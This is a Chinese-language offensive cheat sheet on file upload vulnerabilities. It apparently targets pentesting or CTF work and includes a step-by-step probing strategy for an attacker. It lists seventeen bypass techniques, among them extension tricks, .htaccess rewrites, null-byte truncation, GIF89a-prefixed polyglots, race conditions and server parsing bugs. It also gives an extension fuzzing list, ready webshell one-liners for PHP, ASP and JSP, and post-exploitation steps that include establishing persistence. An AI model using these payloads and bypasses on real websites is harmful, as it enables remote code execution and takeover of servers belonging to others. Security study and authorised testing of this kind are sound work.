# 文件上传漏洞 (File Upload)

当开发者未严格验证和过滤上传文件时，允许攻击者上传可执行的动态脚本（webshell）。

**影响**：攻击者可以通过上传恶意文件（webshell）控制整个网站甚至服务器。

## 决策策略

### 三层推理
- **fact**: 直接观察到的行为（上传是否成功、文件路径返回）
- **hypothesis**: 猜测（未经证实）
- **decision**: 下一步行动

### 最短探针原则
先确认假设，再深入攻击。文件上传最短探针顺序：
1. 上传普通图片 → 确认上传功能存在
2. 上传 .php → 确认是否执行
3. 再尝试 .htaccess、phar 等绕过方式

### 切换规则
上传失败时：
- 检查 MIME 类型验证（Content-Type）
- 检查文件内容验证（getimagesize）
- 尝试绕过扩展名（.php5, .phtml, .phar）
- 尝试上传到不同目录

## 上传流程

1. **客户端**：用户选择文件
2. **上传请求**：表单将文件和字段打包成 HTTP 请求
3. **服务端解析**：提取文件内容和字段（PHP 存储在 `$_FILES`）
4. **验证**：服务端验证文件安全性
5. **存储**：将文件从临时目录移动到目标位置
6. **响应**：服务端返回上传结果

## PHP $_FILES 数组

| 键 | 描述 |
|-----|------|
| `name` | 客户端原始文件名 |
| `type` | MIME 类型（来自 Content-Type 头，**不可靠**） |
| `size` | 文件大小（字节） |
| `tmp_name` | 服务端临时文件路径 |
| `error` | 错误码（0 = 成功） |

## 漏洞分类

### 1. 直接上传（无限制）
- 完全没有任何验证
- 攻击者直接上传 webshell

### 2. 条件上传（可绕过）

| 类型 | 描述 |
|------|------|
| 前端仅验证 | JS 验证，可用直接 HTTP 请求绕过 |
| Header 检查 | 文件头/Magic Number 检测可绕过 |
| 过滤不完整 | 弱的扩展名/MIME 过滤 |
| 缺少认证 | 匿名上传访问 |
| 中间件配置错误 | 服务器解析意外扩展名 |

## 常见可执行扩展名

### PHP 系列
```
.php, .php3, .php4, .php5, .phtml, .pht
```

### ASP 系列
```
.asp, .asa, .aspx, .ashx, .cer, .cdx
```

### JSP 系列
```
.jsp, .jspx, .jspa, .jsw, .jsv, .jspf
```

## 绕过技术

### 1. 前端 JS 绕过
- **方法**：删除前端验证代码
- **方法**：重命名为允许的扩展名，用 Burp 拦截后改回

### 2. Content-Type 绕过
- 服务端检查 `$_FILES['file']['type']`（客户端提供，不可靠）
- **方法**：将 `Content-Type: application/octet-stream` 改为 `Content-Type: image/jpeg`

### 3. 黑名单绕过 - 替代扩展名
- 上传 `.phtml`、`.php5`、`.php3` 而非 `.php`
- 需要 Apache 配置：`AddType application/x-httpd-php .php .phtml .php3 .php5`

### 4. .htaccess 上传
- 上传 `.htaccess` 改变解析规则：
```apache
AddType application/x-httpd-php .jpg
```
- 然后上传 `.jpg` 扩展名的 webshell

### 5. 大小写绕过
- 服务端不规范化大小写
- **方法**：上传 `.PHP`、`.PhP`、`.pHp`

### 6. 空格绕过
- 服务端不 trim 扩展名中的空格
- **方法**：上传 `shell.php `（尾部空格）
- Windows 自动忽略尾部空格

### 7. 点绕过 (Windows)
- 服务端不移除尾部点
- **方法**：上传 `shell.php.`
- Windows 自动移除尾部点，变为 `shell.php`

### 8. NTFS ADS 绕过 (Windows)
- NTFS 备用数据流
- **方法**：上传 `shell.php::$DATA`
- Windows 创建 `shell.php`

### 9. 双扩展名绕过
- 服务端只移除一个尾部点
- **方法**：上传 `shell.php. .` 或 `shell.php..`
- Apache 从右向左解析

### 10. 双写绕过
- 服务端将黑名单扩展名替换为空字符串
- **方法**：上传 `shell.pphphp` → 变为 `shell.php`

### 11. %00 空字节截断
- **GET**：`save_path=/upload/shell.php%00`
- **POST**：需要实际空字节（不是 `%00` 字符串）
- PHP < 5.3.4 有效

### 12. 文件头绕过 (Magic Number)
- 服务端检查文件开头字节
- **方法**：在 webshell 前添加有效图片头：
```
GIF89a<?php @eval($_POST['cmd']); ?>
```
- 或创建图片+PHP 混合文件：
```bash
copy pic.jpg /b + shell.php /a shell.jpg
```
- 需要文件包含才能执行

### 13. 图片函数绕过
- `getimagesize()` / `exif_imagetype()` 验证
- **方法**：上传带 PHP 代码的有效图片
- 需要文件包含漏洞

### 14. 二次渲染绕过
- 服务端重新编码上传的图片
- **方法**：在渲染后不变的图片区域插入 PHP 代码
- GIF 最适合此攻击

### 15. 竞争条件
- 服务端在验证前保存文件
- **方法**：持续上传 + 持续访问
- 使用 Burp Intruder 并发请求

### 16. Apache 解析漏洞
- Apache 从右向左解析扩展名
- **方法**：上传 `shell.php.abc`（未知扩展名）
- Apache 回退到 `.php`

### 17. 数组索引绕过
- PHP 数组使用非连续索引
```php
$file[0] = "shell.php";
$file[2] = "jpg";
// count($file) = 2, $file[1] = NULL
// 扩展名检查失败，保存为 shell.php
```

## 图片 Magic Numbers

| 格式 | 十六进制 | ASCII |
|------|---------|-------|
| JPEG | `FF D8 FF` | - |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `%PNG` |
| GIF | `47 49 46 38 37 61` | `GIF87a` |
| GIF | `47 49 46 38 39 61` | `GIF89a` |

## 其他解析漏洞

### Nginx 0.8.3
```
1.jpg%00php → 被解析为 PHP
```

### PHP-CGI (Nginx/IIS 7+)
```
1.jpg/1.php → 被解析为 PHP
```

### Apache HTTPD (CVE-2017-15715)
```
shell.php\x0A → 被解析为 PHP（换行符）
```

## 攻击流程

1. **识别上传接口**
   - 头像上传、文件编辑器、媒体上传
   - 检查认证要求

2. **捕获 & 测试**
   - 使用 Burp Suite 捕获请求
   - 测试直接脚本上传
   - 分析错误响应

3. **绕过验证**
   - 系统尝试所有绕过技术
   - 检查前端/后端验证
   - 测试扩展名、MIME、内容检查

4. **后渗透**
   - 访问上传文件 URL
   - 验证代码执行
   - 检查目录权限

## 扩展名模糊测试列表

```
.php .php5 .php4 .php3 .php2 .phtml .pht
.pHp .pHp5 .pHp4 .pHp3 .pHp2 .pHtml
.jsp .jspx .jspa .jsw .jsv .jspf .jtml
.asp .aspx .asa .asax .ascx .ashx .asmx .cer
.shtml .htaccess .swf .sWf
```

## CTF 快速参考

| 检查类型 | 绕过方法 |
|----------|----------|
| 前端 JS | Burp 拦截，修改扩展名 |
| Content-Type | 改为 `image/jpeg` |
| 黑名单 | 替代扩展名 (.phtml) |
| 大小写敏感 | `.PHP`, `.PhP` |
| Trim | 尾部加空格、点 |
| Windows | `::$DATA`, 双点 |
| 双写 | `.pphphp` |
| 文件头 | 添加 `GIF89a` 前缀 |
| 图片检查 | 图片混合 + 文件包含 |
| 竞争条件 | 并发上传 + 访问 |
| 路径控制 | `%00` 截断 |
| 数组 | 非连续索引 |

## Webshell 示例

### PHP
```php
<?php @eval($_POST['cmd']); ?>
<?php system($_GET['c']); ?>
```

### ASP
```asp
<%eval request("cmd")%>
```

### JSP
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

## 上传后步骤

1. **找到上传位置** - 检查响应，尝试常见路径：`/uploads/`、`/files/`、`/images/`
2. **验证执行** - 直接访问，检查代码是执行还是显示
3. **建立持久化** - 上传 webshell 以便远程控制
